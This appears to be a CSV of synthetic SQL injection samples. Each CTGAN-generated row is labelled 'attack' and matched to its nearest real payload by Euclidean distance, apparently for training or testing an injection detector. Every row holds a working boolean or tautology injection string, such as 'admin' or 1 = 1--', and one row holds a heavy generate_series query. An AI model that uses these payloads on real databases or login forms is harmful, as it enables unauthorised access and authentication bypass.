id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,boolean,select * from users where id  =  1   or 1  =  1 -- 1,nearest_attack_euclidean,R000046,5.2940106371944555
CTGAN_000002,attack,boolean," select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",nearest_attack_euclidean,R000125,7.954236483155196
CTGAN_000003,attack,boolean,"1'   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000275,7.836812186848703
CTGAN_000004,attack,boolean," select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000152,5.6905460330662265
CTGAN_000005,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,6.556861812401588
CTGAN_000006,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,9.721178699377342
CTGAN_000007,attack,boolean,select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',nearest_attack_euclidean,R000088,8.582754109926261
CTGAN_000008,attack,boolean," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000022,5.656033068233792
CTGAN_000009,attack,boolean,select * from users where id  =  '1'   or 1  =  1 -- 1',nearest_attack_euclidean,R000164,9.253445897163894
CTGAN_000010,attack,boolean," select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000130,5.085514668801397
CTGAN_000011,attack,boolean,select * from users where id  =  '1'   or 1  =  1 -- 1',nearest_attack_euclidean,R000164,4.6768435187537625
CTGAN_000012,attack,boolean,select * from users where id  =  1.*1 or 1  =  1 -- 1,nearest_attack_euclidean,R000148,10.969991071848778
CTGAN_000013,attack,boolean," select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",nearest_attack_euclidean,R000051,7.899616015148529
CTGAN_000014,attack,boolean," select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",nearest_attack_euclidean,R000087,7.2405250148116345
CTGAN_000015,attack,boolean,"x' and 1  =    (  select count  (  *  )   from tabname  )  , --",nearest_attack_euclidean,R000083,7.451659504505695
CTGAN_000016,attack,boolean,select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,nearest_attack_euclidean,R000050,7.255615322170073
CTGAN_000017,attack,boolean," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000139,8.529535786126468
CTGAN_000018,attack,boolean,admin'or 1  =  1 or ''  =  ',nearest_attack_euclidean,R000175,5.083380670143091
CTGAN_000019,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,7.418720548041182
CTGAN_000020,attack,boolean,select * from users where id  =  1 + $+%1 or 1  =  1 -- 1,nearest_attack_euclidean,R000178,7.170007642792142
CTGAN_000021,attack,boolean," select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000011,4.897930447637072
CTGAN_000022,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,4.8655352225931185
CTGAN_000023,attack,boolean,select * from users where id  =  1 <@ or 1  =  1 -- 1,nearest_attack_euclidean,R000060,5.826952337718305
CTGAN_000024,attack,boolean,select * from users where id  =  '1'   or 1  =  1 -- 1',nearest_attack_euclidean,R000164,7.044368348617008
CTGAN_000025,attack,boolean," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000139,11.915435291277785
CTGAN_000026,attack,boolean,select * from users where id  =  1 %  (  $  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000203,8.469610485963502
CTGAN_000027,attack,boolean,"x' and 1  =    (  select count  (  *  )   from tabname  )  , --",nearest_attack_euclidean,R000083,8.601800658904487
CTGAN_000028,attack,boolean,select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000116,6.10294564753945
CTGAN_000029,attack,boolean,%27 or 1  =  1,nearest_attack_euclidean,R000019,8.941444601427314
CTGAN_000030,attack,boolean," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000139,6.1660069949651986
CTGAN_000031,attack,boolean,select * from users where id  =  '1'   or 1  =  1 -- 1',nearest_attack_euclidean,R000164,6.288429164681343
CTGAN_000032,attack,boolean," end and   (  ""vwbx""  =  ""vwbx",nearest_attack_euclidean,R000311,5.811572987068765
CTGAN_000033,attack,boolean,select * from users where id  =  1 + \+%\ or 1  =  1 -- 1,nearest_attack_euclidean,R000205,7.374754681048921
CTGAN_000034,attack,boolean,select * from users where id  =  1 +$+ or 1  =  1 -- 1,nearest_attack_euclidean,R000001,6.53264209362331
CTGAN_000035,attack,boolean,select * from users where id  =  1 or \<$ or 1  =  1 -- 1,nearest_attack_euclidean,R000069,4.467436920787617
CTGAN_000036,attack,boolean," select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000097,8.090336126367038
CTGAN_000037,attack,boolean," select * from users where id  =  1 or "",&"" or 1  =  1 -- 1",nearest_attack_euclidean,R000245,9.233309107213431
CTGAN_000038,attack,boolean," select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000130,4.416217472134724
CTGAN_000039,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000052,7.4903337431145305
CTGAN_000040,attack,boolean,select * from users where id  =  1 or \+<\ or 1  =  1 -- 1,nearest_attack_euclidean,R000248,6.850599352104775
CTGAN_000041,attack,boolean,"admin""  )   or   (  ""1""  =  ""1""--",nearest_attack_euclidean,R000076,8.27582211152467
CTGAN_000042,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.913442165693082
CTGAN_000043,attack,boolean,"or 1  =  1 or """"  =  ",nearest_attack_euclidean,R000015,8.61498595793541
CTGAN_000044,attack,boolean,admin' or 1  =  1--,nearest_attack_euclidean,R000259,4.274775832312682
CTGAN_000045,attack,boolean,admin'  )   or '1'  =  '1,nearest_attack_euclidean,R000210,8.63185983087314
CTGAN_000046,attack,boolean," select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",nearest_attack_euclidean,R000092,6.919618366646328
CTGAN_000047,attack,boolean,select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000118,8.477856106995995
CTGAN_000048,attack,boolean,admin' or 1  =  1--,nearest_attack_euclidean,R000259,8.459123945996295
CTGAN_000049,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,6.894941462407126
CTGAN_000050,attack,boolean," select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",nearest_attack_euclidean,R000061,5.850935421534684
CTGAN_000051,attack,boolean," select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",nearest_attack_euclidean,R000155,7.1553174014282535
CTGAN_000052,attack,boolean,"admin""  )   or   (  ""1""  =  ""1""--",nearest_attack_euclidean,R000076,9.16395366600556
CTGAN_000053,attack,boolean,select * from users where id  =  1   or 1  =  1 -- 1,nearest_attack_euclidean,R000046,10.72472949219922
CTGAN_000054,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.511913468559006
CTGAN_000055,attack,boolean,select * from users where id  =  1 or $ 1  =  1 or 1  =  1 -- 1,nearest_attack_euclidean,R000218,6.574460473548961
CTGAN_000056,attack,boolean,or '7659'  =  '7659,nearest_attack_euclidean,R000090,8.247609927106376
CTGAN_000057,attack,boolean,select * from users where id  =  1 %$ . or 1  =  1 -- 1,nearest_attack_euclidean,R000243,8.156021551682967
CTGAN_000058,attack,boolean,select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',nearest_attack_euclidean,R000007,6.003688134998393
CTGAN_000059,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,4.5693250318120935
CTGAN_000060,attack,boolean," select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000152,9.841704853778694
CTGAN_000061,attack,boolean,select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,nearest_attack_euclidean,R000056,7.176379743601184
CTGAN_000062,attack,boolean,select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,nearest_attack_euclidean,R000020,5.513150558424574
CTGAN_000063,attack,boolean,select * from users where id  =  1   or 1  =  1 -- 1,nearest_attack_euclidean,R000046,6.051024940449142
CTGAN_000064,attack,boolean,or 'text'   =   n'text',nearest_attack_euclidean,R000179,7.03850137714848
CTGAN_000065,attack,boolean,select * from users where id  =  '1'   or 1  =  1 -- 1',nearest_attack_euclidean,R000164,7.10416336041299
CTGAN_000066,attack,boolean,admin' or 1  =  1--,nearest_attack_euclidean,R000259,3.667442315476387
CTGAN_000067,attack,boolean,admin' or 1  =  1--,nearest_attack_euclidean,R000259,8.579255265614082
